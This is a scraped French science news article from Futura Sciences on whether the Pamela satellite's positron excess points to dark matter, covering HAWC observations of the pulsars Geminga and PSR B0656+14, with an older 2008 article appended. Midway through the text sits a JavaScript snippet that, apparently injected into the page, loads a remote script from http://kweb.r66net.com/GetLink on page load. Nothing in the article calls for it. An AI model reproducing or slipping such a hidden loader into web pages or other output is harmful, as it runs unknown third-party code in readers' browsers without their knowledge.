{"title": "De la matiere noire detectee par le satellite Pamela ?", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-12-01", "content": "Il y a presque dix ans, le satellite Pamela avait detecte un exces de positrons dans le rayonnement cosmique. Quelle en etait l'origine ? Celui-ci venait-il de la desintegration de la matiere noire ? de pulsars proches ? Aujourd'hui, des travaux montrent que les pulsars Geminga et PSR B0656+14 ne seraient pas la solution a cette enigme. Le mystere demeure. Ce qu'il faut retenir Les rayons cosmiques pourraient signaler indirectement la presence de particules de matiere noire dans la Voie lactee. En 2008, le satellite Pamela avait mesure un flux anormal de positrons dans ces rayons. Certains se demandaient si ces positrons ne venaient pas en fait de pulsars proches plutot que de la desintegration de la matiere noire. Aujourd'hui, les deux pulsars les plus proches connus, Geminga et PSR B0656+14, semblent finalement hors de cause. Est-ce pour autant le signe que la matiere noire existe ? Interview : quelles particules composent la matiere noire ?                       Selon les calculs et les observations, il existerait dans l'espace une grande quantite de matiere invisible. Cette masse mysterieuse, baptisee matiere noire, est encore aujourd'hui une enigme a laquelle se frottent de nombreux chercheurs. Dans le cadre de sa serie de videos Questions d'experts, sur la physique et l'astrophysique, l'editeur De Boeck a interroge Richard Taillet, chercheur au LAPTH, afin qu'il nous en dise plus sur cette matiere noire.                                       La  matiere noire  pourrait se transformer en matiere normale lors de collisions ou simplement en se desintegrant, selon certaines des theories proposees pour expliquer son existence (qui reste encore hypothetique). Elle pourrait alors augmenter anormalement le flux de particules d' antimatiere  deduit de l'observation des sources classiques de ces particules dans la  Voie lactee , signalant ainsi sa presence.  Or, il y a a peu pres dix ans, le satellite Pamela aurait peut-etre detecte une telle  anomalie  : un exces de  positrons  dans le rayonnement cosmique (voir article ci-dessous) -- ce fut aussi le cas du detecteur  AMS , a bord de l' ISS , en 2013. Ces particules d'antimatiere peuvent etre produites par plusieurs sources  astrophysiques  classiques, en particulier des  naines blanches . Il est possible d'estimer les caracteristiques du flux de positrons atteignant l'environnement de la  Terre  a partir de modeles decrivant la propagation des particules chargees dans la Voie lactee, c'est-a-dire dans le milieu interstellaire plonge dans des  champs magnetiques  turbulents. Ces modeles dependent bien evidemment aussi des sources de positrons et de leurs repartitions connues. Alors, ces anomalies mesurees par Pamela trahissent-elles la presence de la matiere noire ? Deux pulsars bien visibles par leurs emissions, PSR B0656+14 (a gauche) et Geminga (a droite). En haut a gauche, la taille de la Lune sur la voute celeste donne l'echelle de l'image formee par le  High-Altitude Water Cherenkov Gamma-Ray Observatory  (Hawc). (c) John Pretz                               Les pulsars Geminga et PSR B0656+14 ne seraient pas la solution Pas forcement, car les  etoiles a neutrons , plus precisement les  pulsars , sont egalement susceptibles d'expliquer les flux de positrons observes, si certains pulsars sont assez proches du  Systeme solaire . Deux candidats pouvaient etre la cle de l'enigme : Geminga et PSR B0656+14, situes a une distance comprise entre 500 et 1.000  annees-lumiere  environ du  Soleil . Mais, selon des travaux recemment publies dans  Science  par une equipe internationale de physiciens ayant utilise le  High-Altitude Water Cherenkov Gamma-Ray Observatory  ( Hawc ), situe au Mexique, ces deux pulsars ne seraient en realite pas la solution.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  En effet, lorsqu'un  rayon cosmique  entre en collision avec un noyau de la haute  atmosphere , il provoque la creation de particules secondaires, qui vont elles-memes entrer en collision avec les autres noyaux, repetant le processus en cascade. Il se produit alors une gerbe de particules secondaires qui, lorsqu'elles sont chargees, emettent un  rayonnement Cerenkov , capte par les detecteurs de Hawc. Une vue de l'observatoire  High-Altitude Water Cherenkov , situe a plus de 4.000 metres d'altitude sur les pentes d'un volcan mexicain. Les 300 reservoirs contiennent de l'eau tres pure et des detecteurs de rayonnement Cerenkov, une sorte de << bang >> lumineux qui se produit dans l'eau au passage de particules chargees tres rapides. (c) J. Goodman,  HAWC Collaboration                               D'ou provient donc le flux de positrons observe par Pamela ? L'analyse de ce signal permet de savoir si le rayon primaire etait un  photon  gamma ou un noyau : Si le rayon cosmique primaire est un photon gamma, la gerbe contient des  electrons , des positrons et des  rayons gamma  essentiellement. Si le rayon cosmique primaire etait un noyau, la gerbe contient egalement des  muons , des  neutrinos  et des  hadrons  ( protons , neutrons et pions). Le nombre de particules presentes depend quant a lui de l' energie  du rayon cosmique primaire, de l'altitude d'observation et des fluctuations dans le developpement de la gerbe. Or, en observant Geminga et PSR B0656+14, Hawc a permis de decouvrir qu'ils etaient environnes d'un fond gamma inattendu. Les chercheurs en tirent la conclusion qu'il y a un halo de matiere normale autour de ces pulsars qui filtrerait fortement le flux de positrons, en consequence de quoi, celui observe sur Terre, et qui semble anormal, ne proviendrait pas de ces deux pulsars. D'autres chercheurs ne semblent pas convaincus par cette analyse. Il est donc probablement toujours raisonnable de garder la tete froide et de continuer a favoriser l'hypothese que l'on ne sait toujours pas interpreter correctement, dans un sens comme dans l'autre, les observations de Pamela et d' AMS . D'autant plus que rien ne garantit qu'il n'y ait pas d'autres pulsars a quelques centaines d'annees-lumiere du Soleil que nous n'ayons pas encore detectes. Pour en savoir plus Le satellite Pamela a-t-il indirectement detecte la matiere noire ? Article de  Laurent Sacco  publie le 07/11/2008 L'existence de la matiere noire est fortement suspectee mais ne sera definitivement etablie que lorsque des preuves vraiment indiscutables seront obtenues. Ce qui semble etre un exces de positrons dans les rayons cosmiques detecte par le satellite Pamela pourrait etre ce genre de preuve. Mais la prudence reste de mise... On sait qu'il est tres difficile, voire impossible, d'expliquer a la fois la formation des  galaxies , les collisions d' amas de galaxies  et les courbes de rotation des galaxies sans faire intervenir la presence de particules de matiere n'emettant pas de lumiere, tres differentes de celles que l'on sait fabriquer sur Terre et qui, dans l' Univers , dominent par leur  masse  celle de la matiere normale. L'une des theories capables d'expliquer la nature de cette  matiere noire  est la  supersymetrie , car elle predit l'existence de nouvelles particules massives stables et interagissant faiblement avec la matiere normale. Un bon candidat est le  neutralino  et son  antiparticule . Lors de l'annihilation d'une telle paire de particules, une paire d'electron-positron peut etre produite. De maniere generale, si des particules de matiere noire existent dans les galaxies et qu'elles sont capables de donner lieu a des paires de particule-antiparticule, alors il devrait apparaitre un exces de particules d'antimatiere dans le rayonnement cosmique par rapport a la fraction deduite des processus astrophysiques observes et obeissant aux lois du  modele standard . Des paires de neutralinos en s'annihilant peuvent donner des paires de quark-antiquark donnant lieu a la formation de hadrons et de positrons dans la Galaxie. Les paires de neutralinos peuvent aussi donner lieu par annihilation a deux photons gamma, comme indique en bas a gauche. (c) INFN                               Trop de rayons cosmiques de grande energie Les rayons cosmiques frappant l'atmosphere de la Terre causent d'impressionnantes gerbes de particules secondaires rejoignant le sol, comme le montrent les observations du  detecteur Auger . Toutefois, afin d'obtenir des mesures fines des composantes de matiere et d'antimatiere dans le rayonnement cosmique, il est avantageux de le faire directement en dehors de l'atmosphere terrestre. C'est precisement ce que fait depuis son lancement le 15 juin 2006 le satellite  Pamela  (acronyme de  Payload for Antimatter/Matter Exploration and Light-nuclei Astrophysics ) . Les equipes responsables de ses observations, qui analysent aussi bien l'influence de l'activite solaire sur le flux de rayons cosmiques que ses caracteristiques dans la ceinture de radiation, viennent de publier les resultats sur le flux de positrons atteignant la Terre. Effectivement, au-dessus d'une certaine energie, ce flux est anormal si l'on considere des sources standards de positrons dans la Voie Lactee, comme des naines blanches accretant de la matiere. S'agit-il de la preuve incontestable tant attendue de l'existence de la matiere noire ? En bleu la courbe theorique du flux de positrons en fonction de l'energie de ces particule deduite des processus astrophysiques classiques. En rouge les observations de Pamela, l'anomalie est frappante. (c) INFN.                               Il semble malheureusement qu'il soit encore trop tot pour une telle conclusion. En effet, le detecteur equipant Pamela sait normalement faire la difference entre un positron et un proton... mais pas de facon parfaite. D'apres les etudes faites au sol, ce qu'on appelle la calibration, il ne devrait confondre un positron avec un proton qu'environ une fois sur 100.000. Mais si une erreur s'est produite dans le processus de calibration du detecteur, ce qui n'est pas rare, alors le signal observe par Pamela pourrait etre trompeur. On peut aussi soupconner une erreur dans la facon dont on calcule le taux de positrons presents dans la Galaxie decoulant de sources classiques. On ne peut pas ecarter non plus la presence proche de notre Soleil d'une source importante de positrons, non detectee jusqu'a present, comme par exemple un pulsar, qui aurait comme resultat d'augmenter localement le flux de positrons. Ce n'est que si l'on peut recouper ces observations avec d'autres que l'on pourra vraiment etre sur que le flux de positrons anormalement eleve est bien le signal trahissant la presence de la matiere noire dans la Galaxie. Les theoriciens ont d'ores et deja propose des candidats pour expliquer ce flux en supposant l'existence d'une nouvelle particule, plus precisement un  boson scalaire leger . Il existe depuis quelque temps une polemique sur les resultats de Pamela, apres une recente observation mentionnee par les physiciens de l'experience CDF du Tevatron, revelant des jets de muons anormaux. Apparemment difficile a expliquer dans le cadre du modele standard, ce phenomene pourrait peut-etre fournir une explication, sous forme de particules scalaires, aux mesures de Pamela. On pourra consulter sur ces sujets les  blogs  de  Tommaso Dorigo  et  Peter Woit . Esperons que le  LHC , qui devrait etre capable de produire et d'identifier clairement les particules de matiere noire, si elles existent, nous permettent bientot d'y voir plus clair... ", "theme": "sciences"}